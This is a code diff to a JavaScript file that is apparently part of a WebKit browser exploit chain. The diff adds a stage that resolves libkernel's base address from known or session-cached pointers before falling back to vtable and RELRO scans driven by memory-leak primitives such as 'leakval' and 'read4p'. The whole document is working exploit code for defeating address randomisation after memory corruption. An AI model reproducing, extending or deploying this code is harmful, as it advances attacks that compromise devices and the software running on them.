@@ -1714,7 +1714,84 @@ export function verifyLibkernelBase(p, lk, off) {
     return { ok: true, lk, weak: true, warn: "prologue OK — getpid stub not at known offsets" };
 }
 
-/** Resolve ext ptr without reading the code page (OOM-safe on poops cal ptrs). */
+/** Resolve hardcoded / session cal ext ptrs — no vtable, no code-page read. */
+function scanKnownExtPtrChunk(p, webkitBase, off, state, opts) {
+    if (!state) {
+        const ptrs = (opts && opts.knownExtPtrs) || [];
+        state = { ptrs: ptrs, idx: 0 };
+        if (!ptrs.length)
+            return { done: true, lk: null, state: null, phase: "known-skip" };
+        return { done: false, state, phase: "known-start", n: ptrs.length };
+    }
+
+    let batch = 0;
+    while (state.idx < state.ptrs.length && batch < 4) {
+        const raw = state.ptrs[state.idx++];
+        batch++;
+        const fnPtr = parseAddrSync(String(raw).replace(/^0x/i, ""));
+        if (!fnPtr) continue;
+        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null);
+        if (hit) {
+            saveLibkernelSession(hit.lk, hit.iatRva);
+            return {
+                done: true,
+                ok: true,
+                lk: hit.lk,
+                iatRva: hit.iatRva,
+                source: "known+" + raw + "/" + hit.via,
+                state,
+                phase: "known-hit",
+                tried: state.idx,
+            };
+        }
+    }
+
+    if (state.idx >= state.ptrs.length) {
+        return {
+            done: true,
+            lk: null,
+            state,
+            phase: "known-miss",
+            tried: state.ptrs.length,
+        };
+    }
+    return { done: false, state, phase: "known", idx: state.idx, total: state.ptrs.length };
+}
+
+function lkDiagSnapshot(state) {
+    const d = (state && state.diag) || {};
+    return {
+        cells: d.cells != null ? d.cells : 0,
+        vtCount: d.vtables != null ? d.vtables : 0,
+        vtExt: d.vtExt != null ? d.vtExt : 0,
+        nearPages: d.nearPages != null ? d.nearPages : 0,
+        belowPages: d.belowPages != null ? d.belowPages : 0,
+        known: d.known != null ? d.known : 0,
+    };
+}
+
+function lkFinalMiss(state, extra) {
+    extra = extra || {};
+    const snap = lkDiagSnapshot(state);
+    return Object.assign({
+        done: true,
+        ok: false,
+        error: extra.error || "all phases exhausted",
+        state: null,
+        phase: "got-scan-miss",
+        extList: state.extList || [],
+        vtable: state.vtableAbs ? String(state.vtableAbs) : null,
+        cells: snap.cells,
+        vtCount: snap.vtCount,
+        vtExt: snap.vtExt,
+        nearPages: snap.nearPages,
+        belowPages: snap.belowPages,
+        known: snap.known,
+        diag: state.diag,
+    }, extra);
+}
+
+/** Walk module headers before code ptr — never reads fnPtr itself. */
 function findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxPages) {
     if (!fnPtr || fnPtr.hi < 0x8) return null;
     maxPages = maxPages || 512;
@@ -1768,6 +1845,22 @@ function discoverTextareaVtables(p, opts) {
     if (opts.carrier && opts.carrier.textareaAddress > 0)
         addCell("carrier.addr", addrFromNum(opts.carrier.textareaAddress));
     try {
+        const ssCell = sessionStorage.getItem("wk-textareaCell");
+        if (ssCell) addCell("session.cell", parseAddrSync(ssCell));
+        const ssAddr = sessionStorage.getItem("wk-textareaAddr");
+        if (ssAddr) addCell("session.addr", parseAddrSync(ssAddr));
+    } catch (_) { }
+    if (opts.pairCells) {
+        for (let pi = 0; pi < opts.pairCells.length; pi++) {
+            const pc = opts.pairCells[pi];
+            if (pc && pc.cell) addCell(pc.label || "pair", pc.cell);
+        }
+    }
+    try {
+        const expCell = p.leakval(Math.expm1);
+        addCell("expm1.cell", expCell);
+    } catch (_) { }
+    try {
         const ta = document.createElement("textarea");
         if (opts.retain) opts.retain.push(ta);
         addCell("fresh.ta", p.leakval(ta));
@@ -1778,7 +1871,7 @@ function discoverTextareaVtables(p, opts) {
     function addVt(label, vtable, webcore) {
         if (!vtable || !plausibleCodePtr(vtable)) return;
         const e0 = read4p(p, vtable);
-        if (!looksLikeNativeCodeMagic(e0) && e0 == null) return;
+        if (e0 == null) return;
         const k = ptrBig(vtable).toString(16);
         if (seenVt.has(k)) return;
         seenVt.add(k);
@@ -2250,18 +2343,26 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
     opts = opts || {};
     if (!state) {
         state = {
-            stage: "vt",
+            stage: "known",
             sub: null,
             extList: [],
             vtableAbs: null,
             anchors: null,
             loadBaseHdr: null,
-            diag: { cells: 0, vtables: 0, vtExt: 0, abs: 0, nearPages: 0, belowPages: 0 },
+            diag: {
+                cells: 0, vtables: 0, vtExt: 0, abs: 0,
+                nearPages: 0, belowPages: 0, known: 0,
+            },
         };
         return { done: false, state, phase: "got-scan-start" };
     }
 
-    if (!state.diag) state.diag = {};
+    if (!state.diag || typeof state.diag !== "object") {
+        state.diag = {
+            cells: 0, vtables: 0, vtExt: 0, abs: 0,
+            nearPages: 0, belowPages: 0, known: 0,
+        };
+    }
 
     if (!state.anchors) {
         state.anchors = [webkitBase];
@@ -2270,6 +2371,27 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
             const wb = ptrBig(webkitBase);
             if (nb !== wb) state.anchors.push(opts.nativeFn);
         }
+    }
+
+    if (state.stage === "known") {
+        const c = scanKnownExtPtrChunk(p, webkitBase, off, state.sub, opts);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ ok: true, state }, c);
+        }
+        if (c.done) {
+            state.stage = "vt";
+            state.sub = null;
+            state.diag.known = c.tried || 0;
+            return {
+                done: false,
+                state,
+                phase: "known-done",
+                tried: c.tried,
+                prev: c.phase,
+            };
+        }
+        return Object.assign({ state }, c);
     }
 
     if (state.stage === "vt") {
@@ -2285,9 +2407,9 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
             state.stage = "abs";
             state.sub = null;
             opts.vtableAbs = state.vtableAbs;
-            state.diag.cells = c.cells || state.diag.cells;
-            state.diag.vtables = c.vtCount || state.diag.vtables;
-            state.diag.vtExt = (c.extList && c.extList.length) || state.extList.length;
+            state.diag.cells = c.cells != null ? c.cells : state.diag.cells;
+            state.diag.vtables = c.vtCount != null ? c.vtCount : state.diag.vtables;
+            state.diag.vtExt = state.extList.length;
             return {
                 done: false,
                 state,
@@ -2420,28 +2542,12 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
             return Object.assign({ ok: true, state }, c);
         }
         if (c.done) {
-            return {
-                done: true,
-                ok: false,
-                error: "all phases exhausted",
-                state: null,
-                phase: "got-scan-miss",
-                extList: state.extList,
-                vtable: state.vtableAbs ? String(state.vtableAbs) : null,
-                tried: c.tried,
-                prev: c.phase,
-                diag: state.diag,
-                cells: state.diag.cells,
-                vtCount: state.diag.vtables,
-                vtExt: state.diag.vtExt,
-                nearPages: state.diag.nearPages,
-                belowPages: state.diag.belowPages,
-            };
+            return lkFinalMiss(state, { tried: c.tried, prev: c.phase });
         }
         return Object.assign({ state }, c);
     }
 
-    return { done: true, ok: false, state: null, phase: "got-scan-miss", extList: state.extList };
+    return lkFinalMiss(state, { error: "unknown stage " + state.stage });
 }
 
 /** Hunt libkernel prologue in pages below webkit (OOM-safe, no gap scan). */
